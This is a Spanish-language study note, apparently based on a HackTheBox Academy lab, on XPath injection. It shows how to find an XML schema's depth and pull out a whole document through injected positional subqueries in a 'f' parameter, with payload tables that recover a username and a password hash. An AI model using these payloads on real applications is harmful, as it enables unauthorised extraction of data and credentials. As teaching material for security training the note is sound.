---
tags:
  - Datos
  - Pentesting/Explotacion
  - Web/Red-Team
Fecha de actualización: 2025-10-23
Nota previa: "[[Exfiltración de datos]]"
Nota siguiente: "[[Explotación a ciegas]]"
Area: "[[Inyección XPath]]"
---
---

A veces, es imposible extraer todo el documento *XML* a la vez. Una aplicación web podría sólo mostrar los 5 primeros resultados de  la consulta [[Inyección XPath#Fundamentos XPath|XPath]]. Si inyectamos el payload como tratamos en [[Exfiltración de datos]] no obtendremos el documento XML completo.  

# Determianr la profundidad
Para iterar a través del esquema *XML*, **primero debemos determinar la profundidad del esquema**. Podemos lograr esto asegurándonos de que la <mark style="background: #ADCCFFA6;">consulta *XPath* original no devuelva resultados y agregando una nueva consulta que nos brinde información sobre la profundidad</mark> del esquema. Establecemos el término de búsqueda en el parámetro `q` a <mark style="background: #FFB8EBA6;">cualquier cosa que NO devuelva datos</mark>, por ejemplo, `SOMETHINGINVALID`. Luego podemos configurar el parámetro `f` a `fullstreetname | /*[1]`. Esto da como resultado la siguiente consulta *XPath*:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```
> [!info]+
> La subconsulta `/*[1]` **comienza en la raíz del documento** `/`, mueve un nodo hacia abajo en el árbol de nodos debido al comodín `*`, y selecciona el primer hijo debido al predicado `[1]`. De esta forma, <mark style="background: #FFB86CA6;">la subconsulta selecciona el primer hijo de la raíz del documento</mark>, el **nodo del elemento raíz del documento**. Dado que el nodo del elemento raíz del documento <mark style="background: #FFB8EBA6;">tiene varios nodos secundarios, es del tipo de datos `array` en *PHP*</mark>. La aplicación web espera un `string` pero recibe un `array` y por lo tanto no puede imprimir los resultados, lo que da como resultado una respuesta vacía.

Ahora podemos <mark style="background: #ADCCFFA6;">determinar la profundidad del esquema agregando iterativamente un valor adicional `/*[1]` a la subconsulta hasta que cambie el comportamiento de la aplicación</mark> web. Los resultados se ven así (el <mark style="background: #8000E1A6;">parámetro `q` sigue siendo el mismo</mark> que el anterior para todas las solicitudes):

| Valor del parámetro `f`                       | Respuesta     |
| --------------------------------------------- | ------------- |
| `fullstreetname \| /*[1]`                     | Nada          |
| `fullstreetname \| /*[1]/*[1]`                | Nada          |
| `fullstreetname \| /*[1]/*[1]/*[1]`           | Nada          |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[1]`      | `01ST ST`     |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |

De los resultados anteriores, **podemos deducir que la profundidad del esquema para los datos de la calle es `4`**:
![Solicitud HTTP GET con consulta no válida, la respuesta muestra '01ST ST'.](https://academy.hackthebox.com/storage/modules/204/dataexfil_8.png)

Esto nos <mark style="background: #FFB86CA6;">permite comenzar a exfiltrar datos aumentando la posición en el último predicado hasta que no se puedan recuperar más datos</mark>:

| Valor del parámetro `f`                  | Respuesta     |
| ---------------------------------------- | ------------- |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[1]` | `01ST ST`     |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[2]` | `01ST`        |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[3]` | `ST`          |
| `fullstreetname \| /*[1]/*[1]/*[1]/*[4]` | `No Results!` |

<mark style="background: #FF5582A6;">Exfiltramos con éxito información sobre la primera calle del conjunto de datos</mark>. Los tres valores parecen ser los `long street name`, el `short street name` y el `street type`. De esta forma podemos rellenar algunos de los marcadores de posición del esquema *XML* de la sección anterior. Sin embargo, todavía no sabemos los nombres exactos de los nodos. Sólo estamos intentando crear una <mark style="background: #FFB8EBA6;">descripción general de la estructura del documento *XML*</mark>:
```xml
<a>
	<b>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</b>
</a>
```

Ahora podemos <mark style="background: #FFB86CA6;">extraer información sobre la segunda calle en el conjunto de datos incrementando el predicado de posición</mark> penúltima en nuestro payload inyectado de la siguiente manera:

| Valor del parámetro `f`                  | Respuesta     |
| ---------------------------------------- | ------------- |
| `fullstreetname \| /*[1]/*[1]/*[2]/*[1]` | `02ND AVE`    |
| `fullstreetname \| /*[1]/*[1]/*[2]/*[2]` | `02ND`        |
| `fullstreetname \| /*[1]/*[1]/*[2]/*[3]` | `AVE`         |
| `fullstreetname \| /*[1]/*[1]/*[2]/*[4]` | `No Results!` |

Podemos hacer esto hasta que tengamos información filtrada sobre todas las calles. Sin embargo, como no nos interesan las calles, veamos si el documento *XML* contiene otros conjuntos de datos.

---

# Exfiltrar datos de todo el documento XML
<mark style="background: #8000E1A6;">Incrementar el primer predicado de posición en el payload tiene poco sentido, ya que esta es la raíz del documento</mark> y los documentos *XML* válidos solo contienen una única raíz de documento. Sin embargo, **podemos alterar el predicado de segunda posición para encontrar conjuntos de datos adicionales** dentro del documento *XML*. Recuerde que <mark style="background: #ADCCFFA6;">debemos determinar nuevamente la profundidad del esquema</mark>, ya que puede diferir de la profundidad del conjunto de datos de calles. Para ilustrar esto, considere el siguiente documento *XML* de muestra:
```xml
<dataset>
	<streets>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</streets>
	<users>
		<group name="users">
			<user>
				<username>test</username>
				<password>test</password>
			</user>
		</group>
		<group name="admins">
			<user>
				<username>admin</username>
				<password>admin</password>
			</user>
		</group>
	</users>
</dataset>
```

Podemos determinar la profundidad utilizando los siguientes valores de parámetros. Dado que nos centramos en el segundo conjunto de datos del documento *XML*, debemos utilizarlo `/*[1]/*[2]` Como punto de partida:

| Valor del parámetro `f`                            | Respuesta     |
| -------------------------------------------------- | ------------- |
| `fullstreetname \| /*[1]/*[2]`                     | Nada          |
| `fullstreetname \| /*[1]/*[2]/*[1]`                | Nada          |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]`           | Nada          |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]`      | `htb-stdnt`   |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]/*[1]` | `No Results!` |
> [!success]+
> Podemos ver que la **profundidad del esquema es `5`**. Además, parece que <mark style="background: #FFB8EBA6;">hemos exfiltrado un nombre de usuario</mark>. 

Podemos <mark style="background: #FFB86CA6;">exfiltrar todos los datos del usuario incrementando el último predicado de posición</mark>:

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]`|`htb-stdnt`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[2]`|`295362c2618a05ba3899904a6a3f5bc0`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[3]`|`HackTheBox Academy Student Account`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[4]`|`No Results!`|
> [!recomendacion]+
> Parece que hemos filtrado un objeto de usuario que consta de un `username`, `password hash`, y `description`. Ahora podemos **incrementar iterativamente los índices de posición de derecha a izquierda**, para exfiltrar a todos los usuarios.
> 
> <mark style="background: #ADCCFFA6;">Para exfiltrar un documento *XML* completo, tiene sentido implementar un script simple que haga la exfiltración por nosotros</mark>.